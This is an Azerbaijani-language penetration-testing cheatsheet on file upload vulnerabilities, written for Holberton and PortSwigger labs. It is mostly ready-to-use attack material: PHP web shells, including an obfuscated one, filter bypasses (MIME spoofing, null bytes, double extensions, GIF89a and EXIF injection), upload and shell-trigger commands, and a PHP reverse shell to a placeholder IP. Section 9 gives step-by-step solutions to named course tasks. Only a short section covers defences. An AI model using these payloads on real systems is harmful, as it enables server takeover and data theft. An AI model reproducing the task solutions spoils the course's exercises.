# 🔴 File Upload Vulnerabilities — Tam Cheatsheet

> Yalnız icazəli lab/imtahan mühitləri üçün (Holberton Cyber-WebSec 0x05, Burp Academy, öz lab-ın).

---

## 📑 Məzmun

0. [File Upload Vulnerability Nədir](#0-file-upload-vulnerability-nədir)
1. [Niyə Təhlükəlidir](#1-niyə-təhlükəlidir)
2. [Hücum Növləri & Ssenariləri](#2-hücum-növləri--ssenariləri)
3. [Web Shell Nədir & Necə İşləyir](#3-web-shell-nədir--necə-işləyir)
4. [Validation Mexanizmləri & Bypass Texnikaları](#4-validation-mexanizmləri--bypass-texnikaları)
   - 4.1 [Client-Side Bypass](#41-client-side-bypass--task-1)
   - 4.2 [MIME Type / Content-Type Bypass](#42-mime-type--content-type-bypass)
   - 4.3 [Extension Bypass (Special Characters)](#43-extension-bypass-special-characters--task-2)
   - 4.4 [Magic Number (File Signature) Bypass](#44-magic-number-file-signature-bypass--task-3)
   - 4.5 [File Size Bypass](#45-file-size-bypass--task-4)
   - 4.6 [Double Extension Bypass](#46-double-extension-bypass)
   - 4.7 [Content-Disposition Manipulation](#47-content-disposition-manipulation)
5. [Web Shell Payload-ları](#5-web-shell-payload-ları)
6. [File Upload → RCE Zənciri](#6-file-upload--rce-zənciri)
7. [Discovery — Hansı Subdomain/Endpoint-i Hədəf Al](#7-discovery--hansı-subdomainendpoint-i-hədəf-al--task-0)
8. [Burp Suite ilə Praktiki İş Axını](#8-burp-suite-ilə-praktiki-iş-axını)
9. [Holberton Tapşırıqlarına Uyğun Strategiya](#9-holberton-tapşırıqlarına-uyğun-strategiya)
10. [Alətlər](#10-alətlər)
11. [Müdafiə / Prevention](#11-müdafiə--prevention)
12. [Quick Reference Payload Cədvəli](#12-quick-reference-payload-cədvəli)
13. [Faydalı Linklər](#13-faydalı-linklər)

---

## 0. File Upload Vulnerability Nədir

**Tərif:** Veb tətbiq istifadəçidən fayl yükləməyə icazə verir, lakin bu faylın **tipini, məzmununu, adını, ölçüsünü** düzgün validasiya etmədikdə meydana gəlir. Nəticədə attacker server-ə icra oluna bilən (executable) fayl yerləşdirib serverin öz resurslarından istifadə edə bilər.

**Sadə analogy:** Server bir bina, upload endpoint isə paklet qəbul pəncərəsidir. Əgər pəncərə gələn paketdə nə olduğunu yoxlamırsa, içinə bomba qoyulmuş qutu da qəbul eder.

```
İstifadəçi → [Upload Form] → Server fayl saxlayır → Fayl icra olunur
                                                          ↑
                                              Attacker burada PHP web shell yükləyir
```

---

## 1. Niyə Təhlükəlidir

| Risk | İzahı |
|---|---|
| **Remote Code Execution (RCE)** | PHP/JSP/ASPX web shell yükləmək — serverdə ixtiyari əmr icra etmək |
| **Server Takeover** | Reverse shell ilə tam server kontrolu əldə etmək |
| **Sensitive File Read** | `readfile()`, `file_get_contents()` ilə server fayllarını oxumaq |
| **Stored XSS** | SVG, HTML faylı yükləyib digər istifadəçilərə qarşı XSS həyata keçirmək |
| **DoS (Disk Doldurmaq)** | Böyük fayllar yükləyərək serverin diskini doldurmaq |
| **Path Traversal** | Fayl adını `../../etc/passwd` kimi manipulyasiya edərək ixtiyari path-a yazmaq |
| **SSRF (via PDF/HTML render)** | Yüklənmiş HTML/SVG faylı server tərəfindən render ediləndə daxili resurslara müraciət |

---

## 2. Hücum Növləri & Ssenariləri

| Ssenari | Risk Səviyyəsi | Niyə Risklidir |
|---|---|---|
| **Avatar/Profile Picture Upload** | 🔴 Yüksək | Heç bir yoxlama olmaya bilər, SVG XSS mümkündür |
| **Document Upload (CV, PDF)** | 🟠 Orta | MIME type spoofing ilə PHP fayl upload |
| **Import from CSV/Excel** | 🟡 Aşağı-Orta | Formula injection, XXE |
| **Invoice/Report Generation** | 🔴 Yüksək | HTML → PDF render → SSRF |
| **Plugin/Extension Upload** | 🔴 Kritik | Birbaşa ZIP içində PHP shell |
| **ZIP/Archive Upload** | 🔴 Kritik | Zip Slip (path traversal), içindəki fayllar extract olunur |
| **Image Upload** | 🟠 Orta | Metadata-da PHP kod (EXIF injection), magic number bypass |

---

## 3. Web Shell Nədir & Necə İşləyir

**Web Shell** — server-ə yüklənmiş, HTTP sorğusu ilə idarə edilə bilən backdoor fayldır.

```
Attacker → HTTP GET/POST → Web Shell (server-də) → OS əmri icra olunur → Cavab HTTP response-da
```

### Ən Sadə PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
```

İstifadəsi:
```
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
http://target.com/uploads/shell.php?cmd=ls+-la
```

### Holberton Tapşırıqları Üçün Xüsusi PHP Payload

```php
<?php readfile('FLAG_1.txt') ?>   # Task 1 üçün
<?php readfile('FLAG_2.txt') ?>   # Task 2 üçün
<?php readfile('FLAG_3.txt') ?>   # Task 3 üçün
<?php readfile('FLAG_4.txt') ?>   # Task 4 üçün
```

> 🧠 **Qeyd:** `readfile()` faylı oxuyub birbaşa HTTP response-a çıxarır. Fayla path vermirsənsə, web shell-in özü ilə eyni qovluqda axtarır.

---

## 4. Validation Mexanizmləri & Bypass Texnikaları

### 4.1 Client-Side Bypass — Task 1

**Necə işləyir:** JavaScript fayl yüklənmədən əvvəl client-in özündə (browser-də) extension-u yoxlayır. Server tərəfindən heç bir yoxlama yoxdur.

**Zəiflik kodu nümunəsi:**
```javascript
// Yalnız browser-də işləyir, server-ə çatmır
function validateFile(file) {
    if (!file.name.endsWith('.jpg') && !file.name.endsWith('.png')) {
        alert('Only images allowed!');
        return false;
    }
}
```

**Bypass Üsulları:**

**Üsul 1: Browser Developer Tools ilə HTML-i dəyiş**
```
1. F12 → Elements tab aç
2. <input type="file" accept=".jpg,.png"> elementini tap
3. "accept" atributunu sil və ya dəyiş: accept="*/*"
4. İndi PHP faylı birbaşa seç
```

**Üsul 2: Burp Suite ilə Intercept**
```
1. Faylı .jpg uzantısı ilə seç (browser JS-i keçir)
2. Burp Proxy-ni aç, Intercept ON
3. "Upload" düyməsinə bas
4. Burp-da tutulmuş sorğuda filename-i dəyiş:
   Content-Disposition: form-data; name="file"; filename="shell.jpg"
   → dəyiş →
   Content-Disposition: form-data; name="file"; filename="shell.php"
5. Forward et
```

**Üsul 3: curl ilə Birbaşa Göndər**
```bash
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -F "submit=Upload"
```

---

### 4.2 MIME Type / Content-Type Bypass

**Necə işləyir:** Server HTTP request-dəki `Content-Type` header-ini yoxlayır, amma bu header client tərəfindən asanlıqla manipulyasiya oluna bilər.

**Burp Suite ilə Bypass:**

Burp Repeater-də tutulmuş sorğu:
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php          ← BU SERVERƏ GÖRƏSİ BLOKLANIR

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Dəyiş:**
```http
Content-Type: image/jpeg                 ← BU KEÇƏR
```

**Sınana bilən MIME Type-lar:**
```
image/jpeg
image/png
image/gif
image/webp
image/svg+xml
text/plain
application/octet-stream
```

---

### 4.3 Extension Bypass (Special Characters) — Task 2

**Necə işləyir:** Server yalnız son extension-u yoxlayır və ya null byte kimi xüsusi simvollarla aldadıla bilir.

**Null Byte Injection (`%00`):**
```
Fayl adı: shell.php%00.jpg

Server PHP faylı yükləyir, amma:
- Köhnə PHP versiyaları: null byte-dan sonrakı hər şeyi kəsir → fayl "shell.php" kimi saxlanılır
- String comparison zamanı: ".jpg" görür → icazə verir
```

**Burp Suite ilə Null Byte:**
```http
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
```
> ⚠️ Burp-da `%00` URL-encode olunmuş null byte-dır. "Hex" görünüşündə `00` byte-ı birbaşa da əlavə etmək olar.

**Digər Xüsusi Simvol Texnikaları:**

```bash
# Double Extension
shell.php.jpg          # Server "jpg"ni yoxlayır, amma Apache "php"ni icra edə bilər
shell.jpg.php          # PHP-ni icra edir

# Trailing Dot / Space
shell.php.             # Windows-da nokta silinə bilər → shell.php
shell.php              # Trailing space bəzən keçir

# Case Manipulation (Windows/IIS üçün)
shell.PHP
shell.Php
shell.pHp

# Alternate PHP Extensions
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phps          # PHP source görüntüsü üçün, bəzən icra da edir

# Double Encoded
shell%252Ephp        # URL-encoded nokta (double encoding)
```

**Special Character Cheatsheet:**
```
shell.php;.jpg          # Semicolon trick
shell.php:.jpg          # Colon (Windows ADS - Alternate Data Streams)
shell.php/              # Trailing slash
shell.php::$DATA        # Windows NTFS ADS stream
```

---

### 4.4 Magic Number (File Signature) Bypass — Task 3

**Necə işləyir:** Server faylın ilk byte-larını (magic number / file signature) yoxlayır — fayl adına deyil, məzmununa baxır. Biz PHP kodu-nu icazəli bir faylın magic number-i ilə başlatırıq.

**Ümumi Magic Number-lər:**

| Fayl Tipi | Magic Number (Hex) | ASCII |
|---|---|---|
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46 2D` | `%PDF-` |
| ZIP | `50 4B 03 04` | `PK..` |
| BMP | `42 4D` | `BM` |

**Bypass Üsulu 1: GIF Magic Number (Ən Sadə)**

```php
GIF89a
<?php readfile('FLAG_3.txt') ?>
```

> 🎯 **Trick:** İlk sətir `GIF89a` — bu magic number-dir. Server GIF görür ✅. Amma server fayl icra edərkən PHP parser işə düşür, GIF header-ini ignore edir, PHP kodunu tapır.

**Bypass Üsulu 2: JPEG Header + PHP (Hex Editor ilə)**

```bash
# Əsl JPEG faylını götür
cp real_image.jpg shell.php.jpg

# Sona PHP kodu əlavə et
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Fayl adını .php et, MIME type-ı image/jpeg göndər
```

**Bypass Üsulu 3: exiftool ilə EXIF Metadata-ya PHP İnjection**

```bash
# JPEG-in EXIF məlumatına PHP kodu yerləşdir
exiftool -Comment='<?php system($_GET["cmd"]); ?>' innocent.jpg

# Nəticədə fayl həm əsl JPEG magic number-ə malikdir,
# həm də daxilində PHP kodu var
cp innocent.jpg shell.php    # Adını .php et
```

**Bypass Üsulu 4: İkili Redaktə (Python ilə)**

```python
# Magic number əlavə edib PHP shell yarat
payload = b'GIF89a' + b'\n<?php system($_GET["cmd"]); ?>'
with open('shell.php', 'wb') as f:
    f.write(payload)
```

**Bypass Üsulu 5: xxd / dd ilə Manual Hex Redaktə**

```bash
# Mövcud faylın hex dump-ını gör
xxd shell.php | head -5

# PNG header əlavə et (yeni fayl yarat)
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > shell_with_magic.php
cat shell.php >> shell_with_magic.php
```

**Verify etmək:**
```bash
file shell.php           # "PHP script" görünür - magic number yoxdur
file shell_with_magic.php  # "PNG image" - magic number uğurla əlavə olunub
```

---

### 4.5 File Size Bypass — Task 4

**Necə işləyir:** Server maksimum fayl ölçüsü məhdudiyyəti qoyur. Məqsəd bu məhdudiyyəti keçməkdir.

**Bypass Üsulları:**

**Üsul 1: Payload-ı Minimuma Endir**

```php
<?php readfile('FLAG_4.txt') ?>
```
Bu, mümkün olan ən qısa fayldır — artıq heç bir simvol əlavə etmə.

```php
# Alternativ olaraq — yalnız PHP short tag
<? readfile('FLAG_4.txt') ?>

# Hətta daha qısa (bəzən işləyir)
<?=`ls`;?>
```

**Üsul 2: Burp Suite ilə Content-Length Manipulyasiyası**

```http
POST /upload HTTP/1.1
Content-Length: 25          ← Həqiqi ölçüdən kiçik dəyər göndər

------WebKitBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php readfile('FLAG_4.txt') ?>
------WebKitBoundary--
```
> Server Content-Length header-inə baxarsa → kiçik dəyər göndər. Server faktiki faylı ölçürsə → bu işləmir.

**Üsul 3: Faylı Kompressiya et**

```bash
gzip shell.php           # shell.php.gz yarat
# Bəzi serverlər gzip-li faylları accept edib decompress edir
```

**Üsul 4: Chunked Transfer Encoding**

```http
POST /upload HTTP/1.1
Transfer-Encoding: chunked   ← Content-Length olmadan göndər

1a
<?php readfile('FLAG_4.txt') ?>
0

```

**Üsul 5: Response Header-ına Diqqət Et (Task 4 Xüsusi Hint)**

> 📌 Tapşırıqda deyilir: *"There is also another backdoor, just take a look at the response headers"*

```bash
# Response header-larını gör
curl -I http://target.com/upload
# Xüsusi header-lər ola bilər:
# X-Backdoor-Path: /uploads/secret_shell.php
# X-Debug-Upload: /tmp/upload_handler.php
```

Burp Suite-də: Response → Headers tab-ına bax, standart olmayan header-ləri axtar.

---

### 4.6 Double Extension Bypass

```
shell.php.jpg    → Server ".jpg" görür, Apache ".php" icra edir (AddHandler konfiqurasiyasına görə)
shell.jpg.php    → Server son extension-u icra edir
shell.php5       → PHP5 files — bəzən PHP extensions whitelist-ə əlavə olunmayıb
```

**Apache Konfiqurasiya Problemi:**
```apache
# Əgər bu konfiqurasiya varsa:
AddType application/x-httpd-php .php .php5 .phtml

# Onda bu fayllar PHP kimi icra olunur:
shell.phtml
shell.php5
```

---

### 4.7 Content-Disposition Manipulation

```http
# Normal sorğu:
Content-Disposition: form-data; name="file"; filename="shell.jpg"

# Manipulation 1: Fayl adında boşluq
Content-Disposition: form-data; name="file"; filename="shell.php "

# Manipulation 2: Unicode/homoglyph simvollar
Content-Disposition: form-data; name="file"; filename="shell.рhp"   # р = Kiril

# Manipulation 3: Duplicate filename parametri
Content-Disposition: form-data; name="file"; filename="shell.jpg"; filename="shell.php"
```

---

## 5. Web Shell Payload-ları

### PHP Web Shell-lər (Müxtəlif Uzunluqlar)

```php
# 1. Ən Minimal — readfile (Holberton üçün)
<?php readfile('FLAG_1.txt') ?>

# 2. Sadə CMD Shell
<?php system($_GET['cmd']); ?>

# 3. POST parametri ilə (GET bloklanıbsa)
<?php system($_POST['cmd']); ?>

# 4. Passthru (system-ə alternativ)
<?php passthru($_GET['cmd']); ?>

# 5. exec (çıxışı array-a yığır)
<?php exec($_GET['cmd'], $out); echo implode("\n", $out); ?>

# 6. Shell_exec (nəticəni string kimi qaytarır)
<?php echo shell_exec($_GET['cmd']); ?>

# 7. Backtick operator (shell_exec shorthand)
<?php echo `{$_GET['cmd']}`; ?>

# 8. eval() ilə (kod kimi icra)
<?php eval($_POST['code']); ?>

# 9. Gizli / Obfuscated
<?php $f='sys'.'tem'; $f($_GET['c']); ?>

# 10. Reverse Shell başlatmaq
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/SENIN_IP/4444 0>&1'"); ?>
```

### Upload Etdikdən Sonra Shell-i İşə Salmaq

```bash
# Sadə cmd əmri
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=whoami"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "http://target.com/uploads/shell.php?cmd=ls+-la+/var/www/html"

# POST ilə
curl -X POST "http://target.com/uploads/shell.php" -d "cmd=id"
```

---

## 6. File Upload → RCE Zənciri

```
1. UPLOAD POINT-İ TAP
   → /upload, /avatar, /import, /submit-document
   
2. VALİDASİYANI ANLA
   → Client-side only? → JS-i deaktiv et
   → Content-Type check? → Burp ilə dəyiş
   → Extension check? → Double ext, null byte, phtml
   → Magic number check? → GIF89a header əlavə et
   → Size check? → Minimal payload, Content-Length manipulyasiya
   
3. FAYLI UPLOAD ET
   → Uğur mesajı gözlə
   → Upload olunan faylın URL-ini tap (response-da, ya da source-da)
   
4. FAYLI TAPA BİLMİRSƏNSƏ
   → /uploads/, /files/, /media/, /static/, /tmp/ qovluqlarını sına
   → Response header-larına bax (Location, X-Uploaded-Path)
   → Source code-da axtar
   
5. FAYLI İCRA ET
   → Browser-dən URL-ə get
   → curl ilə ?cmd=id göndər
   → FLAG faylını oxu
   
6. PRIVI ESCALATİON (lazım olsa)
   → Reverse shell aç
   → nc -lvnp 4444 (öz maşında)
   → Shell PHP-ni göndər
```

---

## 7. Discovery — Hansı Subdomain/Endpoint-i Hədəf Al — Task 0

**Subdomain Enumeration:**

```bash
# wfuzz ilə subdomain brute force
wfuzz -c -w /usr/share/wordlists/subdomains.txt \
  -H "Host: FUZZ.web0x05.hbtn" \
  --hc 404 http://web0x05.hbtn

# ffuf ilə (daha sürətli)
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://web0x05.hbtn \
  -H "Host: FUZZ.web0x05.hbtn" \
  -fc 404

# gobuster ilə
gobuster vhost -u http://web0x05.hbtn \
  -w /usr/share/wordlists/subdomains.txt \
  --append-domain
```

**Upload Endpoint Discovery:**

```bash
# Mövcud subdomain-lərdə upload endpoint-lərini axtar
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u http://SUBDOMAIN.web0x05.hbtn/FUZZ \
  -fc 404

# Ümumi upload path-ları
/upload
/uploads
/upload.php
/file-upload
/api/upload
/admin/upload
/media/upload
```

**Manual Yoxlama:**
```
1. Hər subdomain-i browser-dən aç
2. Form elementlərini axtar (<input type="file">)
3. "Upload", "Import", "Submit", "Attach" kimi düymələri axtar
4. Source code-a bax (Ctrl+U)
```

---

## 8. Burp Suite ilə Praktiki İş Axını

### Addım 1: Proxy Qur

```
Burp Suite → Proxy → Options → 127.0.0.1:8080
Browser → Proxy settings → Manual: 127.0.0.1:8080
```

### Addım 2: İlk Upload Cəhdi

```
1. Normal bir şəkil (test.jpg) seç və upload et
2. Burp HTTP History-də sorğunu tap
3. "Send to Repeater" (Ctrl+R)
```

### Addım 3: Repeater-də Manipulyasiya

```
Orijinal sorğu:
------WebKitBoundary
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[JPEG binary data]

Dəyişdirilmiş sorğu:
------WebKitBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg       ← MIME type eyni qalır (server-i aldatmaq üçün)

<?php readfile('FLAG_1.txt') ?>    ← Məzmunu PHP ilə əvəzlə
```

### Addım 4: Response-u Analiz Et

```
Uğurlu upload:
→ 200 OK + "File uploaded successfully"
→ Response-da fayl URL-i ola bilər

Uğursuz upload:
→ 400 Bad Request + "Only images allowed"
→ 415 Unsupported Media Type
→ Error mesajını analiz et — filtrin nə yoxladığını anla
```

### Addım 5: Faylı Tap & İcra Et

```bash
# Ümumi upload path-lar
http://target.com/uploads/shell.php
http://target.com/files/shell.php
http://target.com/media/shell.php
http://target.com/static/shell.php

# FLAG-ı oxu
curl http://target.com/uploads/shell.php
```

---

## 9. Holberton Tapşırıqlarına Uyğun Strategiya

| Task | Müdafiə | Bypass Texnikası | Fayl |
|---|---|---|---|
| **0** | Yox | Subdomain enum + upload endpoint tap | `0-target.txt` |
| **1** | Client-side JS filter | Browser DevTools ilə accept attr. sil, ya da Burp Intercept | `shell.php` (FLAG_1) |
| **2** | Server-side extension check | Null byte `%00`, double ext, `.phtml`, special char | `shell.php%00.jpg` |
| **3** | Magic number check | `GIF89a` prefix əlavə et, exiftool EXIF injection | `GIF89a\n<?php readfile('FLAG_3.txt') ?>` |
| **4** | File size limit | Minimal payload, Content-Length spoof, response header-ı yoxla | `<?php readfile('FLAG_4.txt') ?>` |

### Task 1 — Detallı Addımlar

```
1. http://[vuln-subdomain].web0x05.hbtn/task1 → aç
2. F12 → Elements → <input type="file"> tap
3. accept=".jpg,.png" atributunu sil (double-click edib)
4. Fayl seç dialogunda "shell.php" yaz
5. Upload düyməsinə bas
6. Ya da: Burp ilə intercept et, filename="shell.jpg" → filename="shell.php"
   
Shell məzmunu:
<?php readfile('FLAG_1.txt') ?>
```

### Task 2 — Detallı Addımlar

```
1. task2 endpoint-inə get
2. Burp Repeater-də filename manipulyasiya et:

   Cəhd 1: shell.php%00.jpg
   Cəhd 2: shell.php.jpg (double ext)
   Cəhd 3: shell.phtml
   Cəhd 4: shell.php5
   Cəhd 5: shell.php (trailing space)
   
3. Hər cəhddə error mesajını oxu — "what does it block?" anla
4. Uğurlu olduqda, upload olunan faylın URL-ini tap
5. curl ilə şell-ə GET göndər

Shell məzmunu:
<?php readfile('FLAG_2.txt') ?>
```

### Task 3 — Detallı Addımlar

```
Üsul 1 (Ən Sürətli):
1. Aşağıdakı məzmunlu fayl yarat (adı: shell.php):
   GIF89a
   <?php readfile('FLAG_3.txt') ?>
   
2. Burp ilə upload et, Content-Type: image/gif göndər
3. Server magic number yoxlayır → GIF89a görür ✅
4. Fayl server-də .php kimi icra olunur → FLAG_3.txt oxunur

Üsul 2 (exiftool):
exiftool -Comment='<?php readfile("FLAG_3.txt"); ?>' innocent.jpg
cp innocent.jpg shell.php
# Upload et

Verify etmək:
file shell.php    # "GIF image data" göstərməlidir
```

### Task 4 — Detallı Addımlar

```
1. Əvvəlcə response header-larını yoxla:
   curl -I http://[vuln-subdomain].web0x05.hbtn/task4
   
2. Burp-da xüsusi header-ları tap (X- ilə başlayan)

3. Minimal payload hazırla (ən az byte):
   <?php readfile('FLAG_4.txt') ?>
   → Bu cəmi 30 byte-dır
   
4. Yetərsəz olsa Content-Length-i manipulyasiya et:
   Həqiqi fayl ölçüsü: 30 bytes
   Content-Length: 10   ← cəhd et
   
5. Alternative: chunked transfer encoding
```

---

## 10. Alətlər

| Alət | Məqsəd | Quraşdırma |
|---|---|---|
| **Burp Suite Community** | Proxy, Intercept, Repeater, Intruder | `apt install burpsuite` |
| **ffuf** | Subdomain & endpoint brute force | `apt install ffuf` |
| **gobuster** | Directory/subdomain enumeration | `apt install gobuster` |
| **curl** | HTTP sorğuları, upload test | Preinstalled |
| **exiftool** | EXIF metadata manipulyasiyası | `apt install exiftool` |
| **file** | Magic number yoxlama | Preinstalled |
| **xxd** | Hex dump & binary redaktə | Preinstalled |
| **wfuzz** | Web fuzzing, subdomain enum | `apt install wfuzz` |
| **Nikto** | Web server scan, upload endpoint | `apt install nikto` |

```bash
# exiftool — PHP kodu EXIF-ə yerləşdir
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# file — magic number yoxla
file shell.php

# xxd — hex dump gör
xxd shell.php | head -3

# Python ilə magic number əlavə et
python3 -c "open('shell.php','wb').write(b'GIF89a\n<?php readfile(\"FLAG_3.txt\") ?>')"

# curl ilə upload et
curl -X POST http://target/upload -F "file=@shell.php;type=image/gif"

# Nəticəni oxu
curl http://target/uploads/shell.php
```

---

## 11. Müdafiə / Prevention

> Exam-da nəzəri sual gələ bilər — mütləq bil

1. **Yalnız allowlist (whitelist) istifadə et** — `jpg`, `png`, `pdf` kimi sırf icazəli extension-lar. Hər şeyi blokla, yalnız icazəlilərə icazə ver.

2. **Extension-u deyil, məzmunu yoxla** — MIME type detection kitabxanası ilə faylın faktiki tipini müəyyən et.

3. **Magic number + məzmun yoxlaması** — həm başlanğıc byte-ları, həm də tam faylı analiz et.

4. **Upload qovluğunda execution-u deaktiv et** — Apache/Nginx konfiqurasiyasında:
   ```apache
   <Directory /var/www/uploads>
       php_flag engine off
       Options -ExecCGI
       AddType text/plain .php .php5 .phtml
   </Directory>
   ```

5. **Faylları fərqli domain-dən serve et** — `uploads.cdn.example.com` (XSS qarşısını alır).

6. **Fayl adını server-in özü müəyyən etsin** — UUID/hash ilə rename et, istifadəçi adını saxlama:
   ```php
   $filename = bin2hex(random_bytes(16)) . '.jpg';
   ```

7. **Fayl ölçüsü məhdudiyyəti** — həm server-də, həm HTTP server konfiqurasiyasında (`client_max_body_size`).

8. **Antivirus/sandbox scan** — yüklənmiş faylları avtomatik scan et.

9. **Upload qovluğunu web root-dan kənar saxla** — birbaşa URL ilə əlçatmasın.

10. **Content-Disposition header-ini enforce et** — download kimi serve et, birbaşa icra deyil:
    ```http
    Content-Disposition: attachment; filename="document.pdf"
    Content-Type: application/octet-stream
    ```

---

## 12. Quick Reference Payload Cədvəli

```php
# ===== HOLBERTON FLAG PAYLOADS =====
<?php readfile('FLAG_1.txt') ?>     # Task 1
<?php readfile('FLAG_2.txt') ?>     # Task 2
<?php readfile('FLAG_3.txt') ?>     # Task 3
<?php readfile('FLAG_4.txt') ?>     # Task 4

# ===== WEB SHELL-LƏR =====
<?php system($_GET['cmd']); ?>                    # Ən sadə
<?php passthru($_GET['cmd']); ?>                  # Alternativ
<?php echo shell_exec($_GET['cmd']); ?>           # String qaytarır
<?php echo `{$_GET['cmd']}`; ?>                   # Backtick

# ===== MAGIC NUMBER BYPASS =====
GIF89a
<?php readfile('FLAG_3.txt') ?>

# ===== DOUBLE EXTENSION =====
shell.php.jpg
shell.php.png
shell.php%00.jpg       # Null byte
shell.phtml            # Alternate extension
shell.php5             # PHP5
shell.pht              # Alternate

# ===== MIME TYPES (Content-Type header üçün) =====
image/jpeg
image/png
image/gif
image/webp
text/plain
application/octet-stream

# ===== CURL UPLOAD =====
curl -X POST http://target/upload \
  -F "file=@shell.php;type=image/jpeg"

# ===== EXIFTOOL MAGIC NUMBER =====
exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg
cp img.jpg shell.php

# ===== PYTHON MAGIC NUMBER =====
python3 -c "open('shell.php','wb').write(b'GIF89a\n<?php readfile(\"FLAG_3.txt\") ?>')"

# ===== REVERSE SHELL (tam kontrol lazım olsa) =====
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/SENIN_IP/4444 0>&1'"); ?>
# Öz maşında: nc -lvnp 4444
```

---

## 13. Faydalı Linklər

| Mənbə | URL |
|---|---|
| **PortSwigger — File Upload** | https://portswigger.net/web-security/file-upload |
| **PortSwigger Labs** | https://portswigger.net/web-security/file-upload#lab-links |
| **HackTricks — File Upload** | https://book.hacktricks.xyz/pentesting-web/file-upload |
| **OWASP — File Upload Cheat Sheet** | https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html |
| **PayloadsAllTheThings — File Upload** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files |
| **Revshells.com** | https://www.revshells.com/ |
| **ExifTool** | https://exiftool.org/ |
| **Magic Bytes Reference** | https://en.wikipedia.org/wiki/List_of_file_signatures |
| **SecLists Wordlists** | https://github.com/danielmiessler/SecLists |

---
